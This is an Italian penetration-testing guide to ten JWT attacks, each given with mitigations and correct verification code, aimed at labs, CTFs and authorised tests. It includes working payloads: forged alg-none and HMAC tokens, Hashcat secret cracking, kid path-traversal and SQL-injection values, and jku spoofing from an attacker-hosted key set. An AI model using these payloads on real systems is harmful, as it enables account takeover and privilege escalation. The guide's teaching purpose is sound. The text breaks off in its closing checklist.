---
title: 'JWT Attacks: 10 Pentest, Vulnerabilità, e Come Difendersi'
slug: jwt
description: 'Guida pratica agli attacchi JWT: alg none, chiavi HMAC deboli, algorithm confusion, kid, jku e jwk, claim, refresh token, tool da terminale e mitigazioni.'
image: /jwt-token-cose-come-funziona-pentest.webp
draft: false
date: 2026-02-03T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - jwt attacks
  - jwt
  - algorithm confusion
featured: true
---

# Attacchi JWT: guida pratica a firme, header, claim e attacchi

Un JSON Web Token (JWT) è il "biglietto" che molte applicazioni web e API usano per ricordarsi chi sei dopo il login. Il server lo firma, tu lo mandi a ogni richiesta, e lui si fida di quello che c'è scritto dentro. Se questa fiducia è mal riposta, puoi diventare un altro utente, un admin o un servizio.

Un **attacco JWT** sfrutta proprio questo: un errore nella verifica della firma, nella gestione delle chiavi o nel controllo dei claim. Il token in sé non è il problema, lo è il server che lo accetta senza controllarlo bene.

Questa guida è una procedura di test per lab, CTF (Hack The Box, PortSwigger Web Security Academy) e pentest web autorizzati. Trovi:

* un percorso in 8 passi per capire da dove partire quando hai un token in mano
* 10 attacchi, ognuno con prerequisiti, test, risultato atteso e mitigazione
* il codice difensivo corretto, una checklist e le FAQ
* **`myjwt`**, il tool open source di HackIta per decodificare e analizzare un JWT da terminale

> **In breve:** decodifica il token, salva una richiesta valida come riferimento, cambia **un solo elemento alla volta** e confronta la risposta. Un `200` non basta: conta cosa ottieni davvero (dati, ruolo, accesso). Un claim sospetto nel token, da solo, non prova nessuna vulnerabilità: la conferma arriva solo dal comportamento del server.

## Cos'è un JWT

Un JWT firmato (JWS) ha tre parti in base64url separate da punti:

```text
HEADER.PAYLOAD.SIGNATURE
```

```json
// header
{ "alg": "HS256", "typ": "JWT" }
// payload
{ "sub": "42", "role": "user", "iat": 1760000000, "exp": 1760003600 }
```

* La **firma** protegge l'integrità, non la riservatezza: chiunque legga il token legge il payload. Decodificarlo non richiede nessuna chiave.
* La firma è `HMAC(secret, header.payload)` per gli algoritmi `HS*`, oppure una firma con chiave privata per `RS*`, `PS*`, `ES*` e `EdDSA`.
* Un token cifrato (JWE) ha 5 parti e il payload non è leggibile senza chiave. È raro: la maggior parte dei token che incontri nei test è un JWS.

Gli algoritmi sono definiti in RFC 7518 (`HS*`, `RS*`, `ES*`, `PS*`) e RFC 8037 (`EdDSA`). Le best practice di sicurezza sono in RFC 8725.

## Il Glossario: Cosa Significano i Campi

Dentro un JWT trovi nomi brevi che tornano in tutta la guida. Eccoli in parole semplici.

**Header: come è stato firmato il token**

| Campo  | Cosa significa                                                                                       |
| ------ | ---------------------------------------------------------------------------------------------------- |
| `alg`  | L'algoritmo usato per la firma (`HS256`, `RS256`, `none`...). Dice al server *come* controllarla     |
| `typ`  | Il tipo di token, quasi sempre `JWT`                                                                 |
| `kid`  | "Key ID": l'etichetta della chiave usata. Serve al server per scegliere quale chiave usare tra tante |
| `jwk`  | Una chiave pubblica scritta direttamente dentro il token                                             |
| `jku`  | L'indirizzo (URL) di una pagina che contiene le chiavi pubbliche (un "JWK Set")                      |
| `x5u`  | L'indirizzo di un certificato X.509 da scaricare                                                     |
| `x5c`  | Una catena di certificati X.509 scritta dentro il token                                              |
| `crit` | Elenca le estensioni che il server *deve* capire, altrimenti deve rifiutare il token                 |

**Payload: cosa dice il token (i "claim")**

| Claim                       | Cosa significa                                               |
| --------------------------- | ------------------------------------------------------------ |
| `iss`                       | *Issuer*: chi ha emesso il token                             |
| `sub`                       | *Subject*: a chi si riferisce, di solito l'ID dell'utente    |
| `aud`                       | *Audience*: per quale servizio è stato emesso                |
| `exp`                       | *Expiration*: il momento in cui scade (data in formato Unix) |
| `nbf`                       | *Not before*: il momento prima del quale non è ancora valido |
| `iat`                       | *Issued at*: quando è stato emesso                           |
| `jti`                       | Un identificatore unico del singolo token                    |
| `role`, `scope`, `admin`... | Claim decisi dall'applicazione: ruoli e permessi dell'utente |

Le date (`exp`, `nbf`, `iat`) sono numeri: i secondi passati dal 1° gennaio 1970 (tempo Unix). `myjwt` le converte in date leggibili.

**Altri termini che incontri**

| Termine                   | Cosa significa                                                                             |
| ------------------------- | ------------------------------------------------------------------------------------------ |
| Base64url                 | Un modo di scrivere dati come testo. **Non è cifratura**: chiunque lo legge                |
| HMAC                      | Una firma calcolata con un segreto condiviso: chi lo conosce può firmare e verificare      |
| Chiave pubblica / privata | Con `RS256` e simili: la privata firma, la pubblica verifica. La pubblica non è un segreto |
| JWS / JWE                 | JWS è un token *firmato* (3 parti, il caso comune). JWE è *cifrato* (5 parti)              |

## Dove Trovare il Token

| Posizione                                          | Come riconoscerlo                                    |
| -------------------------------------------------- | ---------------------------------------------------- |
| Header `Authorization: Bearer ...`                 | Il caso più comune nelle API                         |
| Cookie (`jwt`, `token`, `session`, `access_token`) | Inizia quasi sempre con `eyJ`                        |
| Corpo della risposta di login                      | JSON con `access_token`, `id_token`, `refresh_token` |
| `localStorage` / `sessionStorage`                  | Visibile dagli strumenti del browser                 |
| Parametri URL, WebSocket, GraphQL                  | Cerca `eyJ` in Burp con la ricerca globale           |

L'header di un JWT in JSON compatto inizia quasi sempre con `eyJ` (è `{"` in base64).

## Come Testare un JWT in un Pentest

Un percorso a imbuto: ogni passo decide il successivo.

1. **Baseline.** Salva la richiesta completa, il token originale, la risposta e l'utente con cui sei autenticato.
2. **Decodifica in locale.** `alg`, `kid`, `iss`, `aud`, `exp`, claim di autorizzazione. Non incollare token reali in decoder online: un JWT valido è una sessione attiva.
3. **Firma.** Cambia un solo claim lasciando la firma originale e confronta la risposta (Attacco 1).
4. **Famiglia successiva in base all'algoritmo.** `HS*`: robustezza del segreto (Attacco 2). `RS*`/`ES*`/`PS*`: algorithm confusion solo se trovi la chiave pubblica (Attacco 3).
5. **Header.** `kid`, `jwk`, `jku`, `x5u`, `x5c`: solo se presenti o accettati dal server (Attacchi 4 e 5).
6. **Regole applicative.** `exp`, `nbf`, `iss`, `aud`, tipo di token, ruoli e autorizzazione lato server (Attacchi 6, 7, 8).
7. **Sessione.** Logout, riuso del token, cambio password, rotazione del refresh token (Attacco 10).
8. **Documenta e ripeti.** Modifica fatta, risultato osservato, impatto reale. Dopo la correzione, rifai lo stesso test.

Non fermarti a `200 OK`: il token modificato deve dare dati o azioni che la sessione di riferimento non aveva. Un `500` è un errore da indagare, non la prova di un bypass.

Per confrontare rapidamente le varianti da terminale:

```bash
URL=https://target.htb/api/admin
for f in baseline.jwt tampered.jwt none.jwt; do
  printf '%-14s ' "$f"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
    -H "Authorization: Bearer $(cat $f)" "$URL"
done
```

```text
baseline.jwt   403 41
tampered.jwt   403 41
none.jwt       200 1873
```

(Output illustrativo: il token `none.jwt` ha ottenuto dati dell'area admin, quindi il server accetta token senza firma.)

## Strumenti

| Strumento                                                                     | Uso                                                                                    |
| ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `myjwt` (tool HackIta)                                                        | Decodifica locale, punti da verificare, controllo della firma HMAC con una chiave data |
| [Burp Suite](https://hackita.it/articoli/burp-suite/) + estensione JWT Editor | Modifica, firma e attacchi guidati nelle richieste intercettate                        |
| `jwt_tool`                                                                    | Tamper, exploit e scansione da riga di comando                                         |
| [Hashcat](https://hackita.it/articoli/hashcat/) (`-m 16500`)                  | Cracking offline del segreto HMAC con GPU                                              |
| [John the Ripper](https://hackita.it/articoli/john-the-ripper/)               | Alternativa a Hashcat per il cracking del segreto                                      |
| `openssl`, `curl`                                                             | Costruire e inviare token a mano                                                       |

Installazione di `jwt_tool` e uso di base (comandi dalla documentazione ufficiale):

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt

python3 jwt_tool.py -h
python3 jwt_tool.py "$JWT"          # decodifica e verifica
python3 jwt_tool.py "$JWT" -T       # modalità tamper interattiva
```

Le opzioni per gli attacchi (`-X a`, `-X k`, `-X i`, `-X s`, `-C -d`, `-M pb`) sono nelle sezioni seguenti. Verifica sempre la sintassi sulla tua versione con `-h`.

## myjwt: il Tool JWT di HackIta

`myjwt` è il tool open source di HackIta per analizzare un JWT da terminale. Decodifica header e payload, converte `exp`, `nbf` e `iat` in date leggibili, segnala i punti da verificare e controlla la firma HMAC con il segreto o il file di chiave che gli passi. Non cerca segreti: per il cracking ci sono Hashcat e `jwt_tool`. Funziona offline, non ha dipendenze e richiede Python 3.8 o superiore.

**Repository:** [github.com/hack-ita/myjwt](https://github.com/hack-ita/myjwt)

```bash
git clone https://github.com/hack-ita/myjwt
cd myjwt
chmod +x myjwt.py

./myjwt.py "$JWT"                                  # decodifica e potential issues
echo "Authorization: Bearer $JWT" | ./myjwt.py     # accetta header, cookie e virgolette
./myjwt.py "$JWT" -k mysecret                      # verifica la firma HMAC con un segreto
./myjwt.py "$JWT" -K public.pem                    # usa i byte esatti di un file come chiave
./myjwt.py "$JWT" --json                           # output per script
./myjwt.py --help                                  # tutte le opzioni
```

Esempio con un token `alg: none` (output reale):

```text
JWT decoded - JWS (3 parts)

== Header ==
{
  "alg": "none",
  "typ": "JWT"
}

== Payload ==
{
  "sub": "admin"
}

== Signature ==
  (empty)

== Potential issues (decoding confirms nothing: verify against the target) ==
  [CANDIDATE] alg is 'none': unsecured token. An issue only if the server accepts it.
  [REVIEW   ] no 'exp': the token may never expire (depends on the token profile).
  [INFO     ] no 'iss': check whether the server enforces an issuer.
  [INFO     ] no 'aud': check whether the server enforces an audience (token substitution).
  [INFO     ] authorization-relevant claims: sub. Relevant only if signature checking can be bypassed.
```

Le etichette non sono vulnerabilità confermate. La decodifica dice cosa testare; la conferma arriva solo dal comportamento del server.

| Etichetta   | Significato                                                   |
| ----------- | ------------------------------------------------------------- |
| `CONFIRMED` | Dimostrato dal tool stesso (per esempio una firma verificata) |
| `CANDIDATE` | Da testare per primo, solo il target può confermarlo          |
| `REVIEW`    | Dipende dalle regole dell'applicazione                        |
| `INFO`      | Contesto                                                      |

Verifica della firma con il vettore di prova pubblico (segreto `your-256-bit-secret`; il tempo relativo cambia a ogni esecuzione):

```text
== Time claims ==
  iat  2018-01-18 01:30:22 UTC  (8y 270d ago)

== Verification ==
  Signature VALID with key 'your-256-bit-secret'
```

| Codice di uscita | Significato                                       |
| ---------------- | ------------------------------------------------- |
| `0`              | Token decodificato (e firma valida con `-k`/`-K`) |
| `1`              | Token non valido o non leggibile                  |
| `2`              | Errore d'uso                                      |
| `3`              | La firma **non** corrisponde                      |

Le opzioni complete sono nel README del repository e in `--help`.

## Panoramica dei 10 Attacchi

| #  | Attacco                             | Prerequisito                                           | Impatto                                            |
| -- | ----------------------------------- | ------------------------------------------------------ | -------------------------------------------------- |
| 1  | Firma non verificata o `alg: none`  | Il server non applica la verifica                      | Token arbitrari accettati                          |
| 2  | Chiave HMAC debole                  | Algoritmo `HS*`, segreto prevedibile                   | Forgiatura di qualsiasi token                      |
| 3  | Algorithm confusion                 | Chiave pubblica nota, libreria che si fida di `alg`    | Forgiatura con la chiave pubblica                  |
| 4  | `kid` insicuro                      | `kid` usato per leggere file o interrogare un database | Chiave controllata dall'attaccante                 |
| 5  | `jwk`, `jku`, `x5u`                 | Il server si fida di chiavi indicate nel token         | Chiave controllata dall'attaccante, SSRF           |
| 6  | Manipolazione dei claim             | Firma aggirata o segreto noto                          | Escalation di privilegi                            |
| 7  | Validazione dei claim insufficiente | `exp`, `nbf`, `iss`, `aud` non controllati             | Token scaduti o di altri servizi accettati         |
| 8  | Token confusion e substitution      | Più servizi o tipi di token con le stesse chiavi       | Accesso con un token non destinato a quel servizio |
| 9  | Bug nelle librerie                  | Versione vulnerabile                                   | Dipende dal CVE                                    |
| 10 | Replay, revoca e refresh token      | Token validi dopo logout o riuso del refresh           | Sessioni persistenti o riutilizzabili              |

## Attacco 1: Firma Non Verificata e `alg: none`

**Come funziona.** Molte librerie hanno due funzioni distinte: una che **decodifica** (legge il token) e una che **verifica** (controlla la firma). Se lo sviluppatore chiama la prima, la firma non conta nulla. In altri casi il server accetta `alg: none`, che indica un token senza firma.

**Prerequisiti.** Un'applicazione che non verifica la firma, oppure che accetta `none`.

**Test A: firma non verificata.** Modifica un claim (per esempio `sub` o `role`) e lascia intatta la firma originale.

```bash
python3 jwt_tool.py "$JWT" -T
```

Se il server risponde come se il token fosse valido, la firma non viene controllata.

**Test B: `alg: none`.** Costruiscilo a mano, ricordando il punto finale:

```bash
b64url() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }

H=$(printf '{"alg":"none","typ":"JWT"}' | b64url)
P=$(printf '{"sub":"administrator"}' | b64url)
echo "$H.$P."
```

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
```

Oppure con `jwt_tool`, che genera le varianti:

```bash
python3 jwt_tool.py "$JWT" -X a
```

Gli identificatori JOSE sono stringhe esatte: `none` è l'unico valore standard. Varianti come `None` o `NONE` contano solo con parser o filtri legacy che non distinguono maiuscole e minuscole: provale come verifica di quel comportamento, non come bypass garantito.

**Risultato atteso.**

| Risposta                                | Interpretazione                                                    |
| --------------------------------------- | ------------------------------------------------------------------ |
| `401`/`403` o errore di firma           | Il server rifiuta: corretto                                        |
| `200` e dati dell'utente che hai scelto | Vulnerabile: conferma con una risorsa che prima non vedevi         |
| `500`                                   | Errore di parsing: non prova la vulnerabilità, indaga nei messaggi |

**Mitigazione.** Verificare sempre la firma con la funzione di verifica, passando una **lista esplicita di algoritmi ammessi** (mai `none`). Non lasciare che sia il token a decidere come essere verificato.

## Attacco 2: Chiave HMAC Debole

**Come funziona.** Con `HS256/384/512` la firma è un HMAC con un segreto condiviso. Se il segreto è debole (`secret`, il nome dell'app, una parola da dizionario) lo recuperi offline confrontando la firma di un token valido con quelle calcolate dalle parole di una lista. Poi firmi i token che vuoi.

**Prerequisiti.** Algoritmo `HS*` e un token valido (basta uno).

**Test con Hashcat** (modalità `16500`, il token intero in un file; il modulo riconosce HS256, HS384 e HS512 dalla lunghezza della firma):

```bash
echo "$JWT" > token.txt
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 token.txt --show
```

**Test con `jwt_tool`:**

```bash
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt
```

**Forgiare un token** una volta trovato il segreto (esempio con `openssl`, verificato con `myjwt`):

```bash
SECRET=secret
H=$(printf '{"alg":"HS256","typ":"JWT"}' | b64url)
P=$(printf '{"sub":"administrator","exp":4102444800}' | b64url)
SIG=$(printf '%s' "$H.$P" | openssl dgst -sha256 -hmac "$SECRET" -binary | b64url)
echo "$H.$P.$SIG" > forged.jwt

./myjwt.py "$(cat forged.jwt)" -k "$SECRET" | tail -1
```

```text
  Signature VALID with key 'secret'
```

**Risultato atteso.** Segreto trovato: il token forgiato viene accettato dal server. Segreto non trovato: non prova che sia sicuro, solo che non è nella lista usata.

**Mitigazione.** Segreti casuali generati da un CSPRNG, lunghi almeno quanto l'output dell'hash (RFC 7518): 256 bit per HS256, 384 per HS384, 512 per HS512, conservati in un secret manager e ruotati. In alternativa, chiavi asimmetriche, così il verificatore non conosce la chiave di firma.

## Attacco 3: Algorithm Confusion

**Come funziona.** Il server firma con `RS256` (chiave privata) e verifica con la chiave **pubblica**. Se la libreria sceglie l'algoritmo leggendo `alg` dal token, puoi impostare `HS256`: la funzione di verifica userà la chiave pubblica come **segreto HMAC**. La chiave pubblica è, appunto, pubblica: firmi tu il token con quella.

**Prerequisiti.** Server con chiavi asimmetriche, libreria che si fida dell'`alg` del token, e la **chiave pubblica esatta** usata dal server.

**Dove trovare la chiave pubblica.**

* `/.well-known/jwks.json`, `/jwks.json`
* `/.well-known/openid-configuration` (campo `jwks_uri`)
* Certificati TLS o file pubblicati dall'applicazione
* In alcuni casi si può ricavare da due token firmati dallo stesso server

**Test con `jwt_tool`:**

```bash
python3 jwt_tool.py "$JWT" -X k -pk public.pem
```

**Test con Burp.** Con JWT Editor: importa la chiave pubblica, convertila in PEM, crea una chiave simmetrica il cui valore `k` è il PEM in base64, poi cambia `alg` in `HS256` e firma con quella chiave. I byte della chiave devono coincidere **esattamente** con quelli usati dal server (formato PEM, newline finali, X.509 contro PKCS#1): una differenza di un byte cambia la firma.

Per controllare in locale che la firma corrisponda ai byte esatti della chiave: `./myjwt.py "$FORGED" -K public.pem`.

**Risultato atteso.** Se il server accetta il token firmato in `HS256`, è vulnerabile. Se rifiuta, controlla prima il formato della chiave: un errore lì dà un falso negativo.

**Mitigazione.** Imporre l'algoritmo lato server (`algorithms=["RS256"]`), associare ogni chiave al suo algoritmo, usare librerie che non accettano una chiave asimmetrica per un algoritmo `HS*`.

## Attacco 4: Il Parametro `kid`

**Come funziona.** `kid` (key ID) indica quale chiave usare per verificare. Se il server lo usa per leggere un file o per una query SQL senza validarlo, controlli tu la chiave.

**Prerequisiti.** Un `kid` presente nel header e una verifica `HS*` o comunque basata su una chiave recuperata dal valore.

**Test A: path traversal verso un file noto.** `/dev/null` è vuoto, quindi la chiave è vuota (in HMAC una chiave vuota e un byte nullo danno la stessa firma, perché le chiavi sono riempite con zeri):

```json
{ "alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null" }
```

Firma il token con chiave vuota. Con `openssl`:

```bash
H=$(printf '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}' | b64url)
P=$(printf '{"sub":"administrator"}' | b64url)
SIG=$(printf '%s' "$H.$P" | openssl dgst -sha256 -mac HMAC -macopt hexkey:00 -binary | b64url)
echo "$H.$P.$SIG"
```

Alcuni strumenti non accettano una chiave vuota: in Burp si usa una chiave simmetrica con un solo byte nullo. Nel formato JWK il campo `k` è in base64url senza padding, quindi `AA`; il lab PortSwigger usa la forma `AA==`. Se l'import fallisce, prova l'altra. Se il percorso è sbagliato, il server risponderà con un errore diverso da quello della firma: sfrutta la differenza per capire quanti `../` servono. Vedi anche [path traversal](https://hackita.it/articoli/path-traversal/).

**Test B: SQL injection nel `kid`.** Se la chiave viene cercata in un database, un valore come questo fa restituire una chiave scelta da te:

```json
{ "alg": "HS256", "typ": "JWT", "kid": "x' UNION SELECT 'secret' -- -" }
```

Firma poi il token con il segreto `secret`. Approfondimento: [SQL injection](https://hackita.it/articoli/sql-injection-classica/).

**Risultato atteso.** Il token è accettato solo se il server usa davvero il `kid` per scegliere la chiave. Altrimenti vedrai un errore di firma, di parsing o di query: confronta i messaggi.

**Mitigazione.** Trattare `kid` come input non fidato: mappare gli ID su un elenco chiuso (dizionario in memoria), query parametrizzate, nessun accesso al filesystem con valori del token.

```python
# Vulnerabile
key = open("/keys/" + header["kid"]).read()

# Corretto
KEYS = {"2026-10": b"...", "2026-11": b"..."}
key = KEYS[header["kid"]]    # KeyError = token rifiutato
```

## Attacco 5: `jwk`, `jku` e `x5u`

**Come funziona.** Questi header permettono di indicare la chiave di verifica **dentro** o **fuori** dal token:

| Header | Significato                                     | Rischio                                                                |
| ------ | ----------------------------------------------- | ---------------------------------------------------------------------- |
| `jwk`  | Chiave pubblica incorporata nel token           | Il server usa la tua chiave                                            |
| `jku`  | URL di un JWK Set da scaricare                  | Il server scarica le chiavi dal tuo host (SSRF)                        |
| `x5u`  | URL da cui scaricare un certificato X.509       | Il server scarica il certificato dal tuo host (SSRF)                   |
| `x5c`  | Catena di certificati X.509 **dentro** il token | Il server si fida di una catena non validata contro una CA attendibile |

La condizione è sempre la stessa: il campo nel token non basta, il verificatore deve usarlo per scegliere la chiave.

**Test `jwk` (chiave incorporata).** Genera una coppia RSA, firma con la tua chiave privata e incorpora la pubblica nell'header.

```bash
python3 jwt_tool.py "$JWT" -X i
```

In Burp: JWT Editor, scheda Keys per generare la chiave RSA, poi *Attack > Embedded JWK* nella richiesta.

**Test `jku` (JWK Set remoto).** Pubblica un file `jwks.json` sul tuo host, imposta `jku` all'URL e firma con la tua chiave privata. Il `kid` nel header deve corrispondere a quello del JWKS.

```bash
python3 -m http.server 8000     # serve jwks.json dal tuo host

python3 jwt_tool.py "$JWT" -X s     # JWKS spoofing: l'URL si imposta in jwtconf.ini
```

Se il server ha una lista di host consentiti, prova le tecniche classiche di bypass: URL con credenziali (`https://host-consentito@tuo-host`), frammenti (`#`), sottodomini controllati, redirect aperti. Un `jku` che il server richiama indica anche una [SSRF](https://hackita.it/articoli/ssrf/): controlla se arriva una richiesta al tuo listener.

**Risultato atteso.** Il server contatta il tuo host o accetta la chiave incorporata e il token firmato da te viene accettato.

**Mitigazione.** Non fidarsi mai di chiavi presenti nel token. Usare un JWKS **configurato lato server** per l'issuer, con host in allow list, o ignorare `jwk`/`jku`/`x5u` del tutto. Per `x5c`, validare la catena contro radici attendibili e legarla all'issuer atteso.

## Attacco 6: Manipolazione dei Claim

**Come funziona.** Dopo aver aggirato la firma (attacchi 1–5) o recuperato il segreto, i claim diventano modificabili. L'impatto dipende da cosa il server legge dal token.

Claim da provare:

| Claim                                | Prova                                                                      |
| ------------------------------------ | -------------------------------------------------------------------------- |
| `sub`, `user_id`, `uid`              | Passare a un altro utente (vedi [IDOR](https://hackita.it/articoli/idor/)) |
| `role`, `roles`, `admin`, `is_admin` | Elevare i privilegi                                                        |
| `scope`, `scp`, `permissions`        | Ampliare i permessi                                                        |
| `tenant`, `org`, `account`           | Accedere a dati di un altro tenant                                         |
| `email`, `username`                  | Impersonare un utente per nome                                             |

```bash
python3 jwt_tool.py "$JWT" -I -pc role -pv admin
```

**Test.** Cambia **un claim per volta** e confronta con la risposta di riferimento. Un `200` dopo la modifica non è una prova: verifica di aver ottenuto dati o azioni che prima non avevi. Vedi anche [controllo degli accessi](https://hackita.it/articoli/broken-access-control/).

**Mitigazione.** Non basare l'autorizzazione solo su claim modificabili da chi firma male: ricontrolla ruoli e permessi lato server (database o policy) a ogni richiesta sensibile.

## Attacco 7: Validazione dei Claim Insufficiente

**Come funziona.** Una firma valida non basta. Il server deve anche controllare che il token sia ancora valido, emesso da chi ci si aspetta e destinato a lui.

| Claim | Controllo che manca | Test                                          |
| ----- | ------------------- | --------------------------------------------- |
| `exp` | Scadenza            | Usa un token scaduto                          |
| `nbf` | Non valido prima di | Usa un token con `nbf` nel futuro             |
| `iss` | Emittente atteso    | Cambia l'issuer (con firma valida)            |
| `aud` | Destinatario        | Usa un token emesso per un'altra applicazione |
| `iat` | Età massima         | Token molto vecchi ma non scaduti             |

```bash
./myjwt.py "$JWT"     # leggi exp, nbf e potential issues in un colpo
```

**Risultato atteso.** Il server deve rifiutare ogni variante. Se accetta un token scaduto, anche da giorni, la validazione di `exp` manca.

**Mitigazione.** Richiedere i claim che servono (`exp`, `iss`, `aud`) e validarli sempre; accettare una piccola tolleranza di orologio e non di più.

## Attacco 8: Token Confusion e Substitution

**Come funziona.** Lo stesso emittente produce token per scopi diversi (ID token, access token, refresh token, token per servizi interni), spesso con le stesse chiavi. Se un servizio non controlla *per cosa* è stato emesso il token, accetta quello sbagliato.

Prove:

* Un **ID token** OpenID usato come access token su un'API.
* Un token del servizio **A** inviato al servizio **B** con lo stesso issuer e le stesse chiavi.
* Un token dell'ambiente di **staging** accettato in produzione, se condividono la chiave.
* Un token con `typ` o `aud` diversi da quelli attesi.

Contesto utile: [OAuth security](https://hackita.it/articoli/oauth-security/) e [attacchi OAuth](https://hackita.it/articoli/oauth-attack/).

**Mitigazione.** Validare `aud` e il tipo di token per ogni servizio, usare chiavi diverse per ambienti e scopi diversi, rifiutare il token se `iss`/`aud` non corrispondono a quanto atteso (RFC 8725).

## Attacco 9: Bug nelle Librerie

**Come funziona.** Alcune vulnerabilità non dipendono dalla configurazione ma dalla libreria. Esempi documentati:

| CVE            | Componente e versioni                       | Problema                                                   | Quando testarlo                 |
| -------------- | ------------------------------------------- | ---------------------------------------------------------- | ------------------------------- |
| CVE-2015-9235  | `jsonwebtoken` (Node.js) prima della 4.2.2  | Confusione tra algoritmi asimmetrici e HMAC                | Stack Node con versione vecchia |
| CVE-2018-0114  | `node-jose` prima della 0.11.0              | Chiave `jwk` incorporata nel token considerata attendibile | Token con `jwk`, backend Node   |
| CVE-2022-21449 | Java 15–18 prima delle patch di aprile 2022 | Firme ECDSA non valide accettate ("psychic signatures")    | Token `ES*` verificati da Java  |

Controlla sempre l'advisory ufficiale per le versioni esatte e la versione corretta.

**Test.** Identifica linguaggio, libreria e **versione** (da `package.json`, `pom.xml`, `requirements.txt`, header di risposta, messaggi d'errore). Poi cerca gli advisory ufficiali di quella versione. Non dedurre una vulnerabilità solo dal nome della libreria. In `jwt_tool` esiste un controllo per la firma ECDSA vuota (`-X p`), da usare solo su stack coerenti.

La scansione automatica di `jwt_tool` (playbook) è utile per avere un quadro iniziale su un endpoint, in un lab:

```bash
python3 jwt_tool.py -t https://target.htb/api/me \
  -rc "jwt=$JWT" -cv "Welcome" -M pb
```

**Mitigazione.** Mantenere le librerie aggiornate, preferire librerie mature, non scrivere il proprio parser JWT.

## Attacco 10: Replay, Revoca e Refresh Token

**Come funziona.** Un JWT firmato è valido finché non scade: il server non lo "ricorda". Se manca un meccanismo di revoca, un token rubato funziona fino alla scadenza.

Test:

| Test                                           | Cosa osservare                                                       |
| ---------------------------------------------- | -------------------------------------------------------------------- |
| Logout, poi riutilizzo del token               | Se funziona ancora, il logout non invalida nulla lato server         |
| Cambio password, poi riutilizzo                | I token vecchi dovrebbero essere rifiutati                           |
| Refresh token usato due volte                  | Con la rotazione, il secondo uso deve fallire e invalidare la catena |
| Refresh token di un altro utente o dispositivo | Dovrebbe essere legato alla sessione                                 |
| Durata dell'access token                       | `exp - iat` di ore o giorni è troppo lungo (`myjwt` lo segnala)      |
| Stesso token da due IP/dispositivi             | Utile per capire se ci sono controlli contestuali                    |

Il furto di un token può avvenire per XSS se è in `localStorage`, o per CSRF se è in un cookie senza `SameSite`. Vedi [session hijacking](https://hackita.it/articoli/session-hijacking/) e [autenticazione rotta](https://hackita.it/articoli/broken-authentication/).

**Mitigazione.** Access token brevi (minuti), refresh token con rotazione e rilevamento del riuso, lista di revoca per le sessioni sensibili, cookie `HttpOnly; Secure; SameSite`. Un `jti` da solo non impedisce il replay: serve un meccanismo lato server che lo registri e rifiuti i token revocati o già usati.

## Difese: Verifica Corretta del Token

Esempio con PyJWT: sbagliato e corretto.

```python
import jwt

# SBAGLIATO: nessuna verifica della firma
claims = jwt.decode(token, options={"verify_signature": False})

# CORRETTO: algoritmo imposto dal server, claim obbligatori e validati
claims = jwt.decode(
    token,
    key=PUBLIC_KEY,
    algorithms=["RS256"],
    audience="api.example.com",
    issuer="https://login.example.com",
    options={"require": ["exp", "iss", "aud"]},
)
```

Esempio con `jsonwebtoken` (Node.js):

```javascript
const jwt = require("jsonwebtoken");

// SBAGLIATO: decode non verifica la firma
const claims = jwt.decode(token);

// CORRETTO: verifica firma, algoritmo, issuer e audience...
const claims = jwt.verify(token, PUBLIC_KEY, {
  algorithms: ["RS256"],
  audience: "api.example.com",
  issuer: "https://login.example.com",
});

// ...ma verify() controlla exp solo se c'è: va richiesto esplicitamente
if (typeof claims.exp !== "number") {
  throw new Error("missing exp");
}
```

| Controllo                                    | Perché                                    |
| -------------------------------------------- | ----------------------------------------- |
| Lista di algoritmi decisa dal server         | Blocca `none` e algorithm confusion       |
| Chiave legata all'algoritmo e all'issuer     | Evita la chiave sbagliata per il contesto |
| `kid` risolto su elenco chiuso               | Blocca traversal e injection              |
| Nessuna fiducia in `jwk`/`jku`/`x5u`         | Blocca chiavi controllate dall'attaccante |
| `exp`, `iss`, `aud` obbligatori e verificati | Blocca scaduti, riuso tra servizi         |
| Segreti HMAC lunghi e casuali                | Blocca il cracking                        |
| Token brevi, refresh con rotazione, revoca   | Riduce il danno di un furto               |
| Autorizzazione ricontrollata lato server     | Il token non è l'unica fonte di verità    |

## Laboratori per Allenarsi

I lab della Web Security Academy di PortSwigger coprono i casi principali (verifica della firma non corretta, segreto debole, iniezione di `jwk` e `jku`, traversal su `kid`, algorithm confusion con e senza chiave esposta). Sono ambienti legali e gratuiti. I nomi esatti e le soluzioni si trovano nella sezione JWT del sito. Su Hack The Box troverai JWT nelle macchine e nei challenge web. Per il contesto API: [guida agli attacchi alle API moderne](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/) e [autenticazione e controllo accessi](https://hackita.it/articoli/auth-access-control-guida-completa/).

## Troubleshooting

| Sintomo                                   | Causa probabile                                  | Cosa controllare                                                                                  |
| ----------------------------------------- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------- |
| Sempre `401` anche con il token originale | Scaduto o legato a IP/sessione                   | `./myjwt.py` mostra `exp`; ottieni un token fresco                                                |
| `400`/`500` dopo la modifica              | Errore di parsing                                | Base64url senza `=`, punto finale per `none`, JSON valido                                         |
| Token `none` rifiutato                    | Il server blocca `none` (comportamento corretto) | Passa agli altri test; le varianti di maiuscole servono solo con parser legacy                    |
| Algorithm confusion senza effetto         | Chiave pubblica in formato diverso               | PEM, newline finali, X.509 contro PKCS#1                                                          |
| Cracking senza risultati                  | Segreto non in wordlist, o non è HMAC            | Controlla `alg`; prova regole e wordlist più ampie con Hashcat                                    |
| `jku` non genera richieste                | Allow list o filtri di rete                      | Prova `jwk`, controlla log del tuo listener                                                       |
| Hashcat: `Token length exception`         | File con righe extra o spazi                     | Una sola riga, senza `Bearer` né newline spuri                                                    |
| Il tool dice "invalid base64url"          | Token copiato con caratteri extra                | Rimuovi `Bearer`, virgolette, punto e virgola; il tool lo fa da solo nella maggior parte dei casi |

## Checklist Operativa

```text
[ ] Token individuato e richiesta di riferimento salvata
[ ] Header e payload decodificati (alg, kid, jku, iss, aud, exp, ruoli)
[ ] Firma modificata/rimossa: il server la verifica?
